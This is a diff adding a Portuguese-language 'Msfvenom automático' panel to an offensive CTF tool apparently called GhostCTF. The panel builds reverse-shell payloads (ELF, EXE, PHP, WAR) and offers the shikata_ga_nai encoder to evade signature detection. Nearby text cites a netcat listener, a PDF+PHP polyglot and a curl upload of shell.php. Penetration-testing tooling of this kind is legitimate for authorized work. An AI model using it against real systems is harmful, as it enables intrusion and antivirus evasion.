@@ -1514,6 +1514,34 @@
           <button type="button" class="export-btn" style="padding:4px 8px;font-size:9px" onclick="ghostctfSavePayloadToDisk({ openNcAfter: true })">Gravar + mini-nc</button>
           <button type="button" class="export-btn" style="padding:4px 10px;font-size:9px;border-color:var(--accent2);color:var(--accent2)" id="wandenreichPostShellManualBtn" title="Depois da shell ligar: o que fazer no alvo" aria-label="Manual pós-shell Wandenreich">Manual</button>
         </div>
+        <div style="margin-top:12px;padding-top:12px;border-top:1px solid var(--border)">
+          <div style="font-size:9px;color:var(--text-dim);margin-bottom:8px;line-height:1.45">
+            <strong>Msfvenom automático</strong> — corre <code style="color:var(--text-bright)">msfvenom</code> na máquina onde o <strong>servidor Node</strong> do GhostCTF está a correr (típico: <strong>Kali</strong>). Escolhe <strong>formato</strong> por plataforma; em presets <strong>x86</strong> podes ativar <strong>encoder</strong> (ex.: <code>x86/shikata_ga_nai</code>) para reduzir deteção por assinaturas simples. Usa os mesmos LHOST/LPORT de cima.
+          </div>
+          <label style="display:block;font-size:9px;color:var(--text-dim);margin:0 0 6px">Plataforma / formato de saída
+            <select id="wandenreichMsfvenomPreset" style="width:100%;margin-top:4px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:6px 8px;border-radius:2px">
+              <option value="linux_x64_elf">Linux x64 → .elf</option>
+              <option value="linux_x86_elf">Linux x86 → .elf (encoder disponível)</option>
+              <option value="windows_x64_exe">Windows x64 → .exe</option>
+              <option value="windows_x86_exe">Windows x86 → .exe (encoder disponível)</option>
+              <option value="php_raw">PHP → .php (raw / reverse_php)</option>
+              <option value="java_war">Java → .war (shell_reverse_tcp)</option>
+            </select>
+          </label>
+          <div style="display:flex;flex-wrap:wrap;gap:10px;align-items:flex-end;margin-top:8px">
+            <label style="font-size:9px;color:var(--text-dim);flex:1;min-width:140px">Encoder (só x86)
+              <select id="wandenreichMsfEncoder" style="width:100%;margin-top:4px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:6px 8px;border-radius:2px" title="x86/shikata_ga_nai: ofuscação comum; só aplica a payloads x86">
+                <option value="" selected>(sem encoder)</option>
+                <option value="x86/shikata_ga_nai">x86/shikata_ga_nai</option>
+              </select>
+            </label>
+            <label style="font-size:9px;color:var(--text-dim)">Iterações
+              <input id="wandenreichMsfEncIter" type="number" min="1" max="10" value="3" style="display:block;width:64px;margin-top:4px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:6px 8px" title="Número de passes do encoder (1–10)">
+            </label>
+          </div>
+          <button type="button" class="export-btn" style="margin-top:10px;padding:4px 10px;font-size:9px" onclick="ghostctfWandenreichMsfvenomBuild()">Gerar msfvenom → payloads/</button>
+          <p style="font-size:8px;color:var(--text-dim);margin:8px 0 0;line-height:1.4">x64 / PHP / WAR: encoders x86 não se aplicam. Metasploit no PATH; primeiro run pode demorar. Apenas em alvos autorizados.</p>
+        </div>
         </div>
       </div>
 
@@ -2074,6 +2102,7 @@
         <li><strong>Tipo de ficheiro</strong> — escolhe no menu (PHP, shell, Python, Perl, Ruby, Node, JSP, PDF+PHP polyglot, PowerShell, webshell).</li>
         <li><strong>Gravar + mini-nc</strong> — para payloads <strong>reverse TCP</strong>, abre o painel e <code>nc -nlvp</code> na <strong>porta local</strong>; webshell não usa listener.</li>
         <li><strong>PDF + PHP</strong> — cabeçalho PDF mínimo + mesmo reverse PHP (cenários de upload/LFI em CTF); o alvo tem de interpretar PHP no contexto do desafio.</li>
+        <li><strong>Msfvenom automático</strong> — o servidor Node executa <code>msfvenom</code> (precisas de Metasploit no PATH, ex. Kali). Escolhes plataforma/formato (<code>.elf</code>, <code>.exe</code>, <code>.php</code> raw, <code>.war</code> Java). Em presets <strong>x86</strong> podes usar <code>-e x86/shikata_ga_nai</code> e iterações para ofuscar contra assinaturas simples; <strong>x64 / PHP / WAR</strong> não usam esse encoder.</li>
       </ul>
       <p>
         <strong>curl</strong> (exemplo): <code>curl -k -F "ficheiro=@shell.php" …</code> — o <code>name</code> do campo deve bater com o HTML.
@@ -2652,6 +2681,57 @@ function initWandenreichPayloadKindUi() {
     ghostctfSyncWandenreichKindUi();
   });
   ghostctfSyncWandenreichKindUi();
+}
+
+function ghostctfSyncWandenreichMsfEncoderUi() {
+  const presetEl = document.getElementById('wandenreichMsfvenomPreset');
+  const encEl = document.getElementById('wandenreichMsfEncoder');
+  const iterEl = document.getElementById('wandenreichMsfEncIter');
+  if (!presetEl || !encEl || !iterEl) return;
+  const preset = presetEl.value;
+  const encodable = preset === 'linux_x86_elf' || preset === 'windows_x86_exe';
+  encEl.disabled = !encodable;
+  if (!encodable) encEl.value = '';
+  const encOn = Boolean(encEl.value);
+  iterEl.disabled = !encodable || !encOn;
+}
+
+function initWandenreichMsfvenomUi() {
+  const presetEl = document.getElementById('wandenreichMsfvenomPreset');
+  const encEl = document.getElementById('wandenreichMsfEncoder');
+  if (!presetEl || !encEl) return;
+  presetEl.addEventListener('change', ghostctfSyncWandenreichMsfEncoderUi);
+  encEl.addEventListener('change', ghostctfSyncWandenreichMsfEncoderUi);
+  ghostctfSyncWandenreichMsfEncoderUi();
+}
+
+async function ghostctfWandenreichMsfvenomBuild() {
+  const lhost = document.getElementById('msfLhost')?.value?.trim() || '';
+  const rawP = document.getElementById('msfLport')?.value?.trim() || '4444';
+  const lport = parseInt(rawP, 10) || 4444;
+  const preset = document.getElementById('wandenreichMsfvenomPreset')?.value || 'linux_x64_elf';
+  const encoder = document.getElementById('wandenreichMsfEncoder')?.value?.trim() || '';
+  const iterations = parseInt(document.getElementById('wandenreichMsfEncIter')?.value || '3', 10) || 3;
+  if (!lhost) {
+    addLog('[msfvenom] Preenche LHOST.', 'warn');
+    return;
+  }
+  addLog('[msfvenom] A gerar no servidor GhostCTF… (encoding pode demorar)', 'info');
+  try {
+    const res = await fetch(apiUrl('/api/ghostctf/msfvenom-build'), {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ preset, lhost, lport, encoder, iterations }),
+    });
+    const j = await res.json().catch(() => ({}));
+    if (!res.ok || !j.ok) {
+      addLog(j.error || `[msfvenom] HTTP ${res.status}`, 'error');
+      return;
+    }
+    addLog(`[msfvenom] Gravado ${j.relativePath} — handler: msfconsole multi/handler com o payload correspondente.`, 'success');
+  } catch (e) {
+    addLog(`[msfvenom] ${e?.message || String(e)}`, 'error');
+  }
 }
 
 /**
@@ -3879,6 +3959,7 @@ updateModuleTags();
 fetchKaliCapabilities();
 initSidebarPayloadModules();
 initWandenreichPayloadKindUi();
+initWandenreichMsfvenomUi();
 loadRunsHistory();
 </script>
 </body>
